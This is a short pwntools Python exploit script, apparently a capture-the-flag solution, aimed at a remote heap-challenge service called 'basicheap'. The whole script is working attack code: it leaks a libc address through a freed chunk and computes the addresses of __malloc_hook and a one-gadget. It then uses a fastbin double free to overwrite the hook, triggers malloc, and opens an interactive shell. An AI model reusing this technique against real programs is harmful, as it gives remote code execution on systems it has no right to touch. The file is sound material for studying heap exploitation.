from pwn import * 

t = remote("basicheap.tendollar.kr", 11000)

def c(a,b):
    t.sendlineafter("Quit","1")
    t.sendlineafter("Input Length",str(a))
    t.sendlineafter("Input Memo!",str(b))

def s(a):
    t.sendlineafter("Quit","2")
    t.sendlineafter("Note",str(a))

def d(a):
    t.sendlineafter("Quit","3")
    t.sendlineafter("Note",str(a))

c(0x60,"a")
c(0x60,"")
c(0x100,"b")
c(0x60,"c")

d(2)
s(2)

t.recvline()
ma = u64(t.recv(6).ljust(8,'\x00'))
#print hex(ma)

libc = ma - 0x3c4b78
log.success("libc : " + hex(libc))
malloc_hook = libc + 0x00000000003C4B10
log.success("malloc_hook : " + hex(malloc_hook))
one = libc + 0x00000000000F1147
log.success("oneshot : " + hex(one))
c(0x100,"b")

d(0)
d(1)
d(0)

c(0x60,p64(malloc_hook-35))
c(0x60,"a")
c(0x60,"b")
pause()
c(0x60,"a"*3 + p64(one)*3)
pause()
t.sendline("1")
t.sendline("1")

t.interactive()
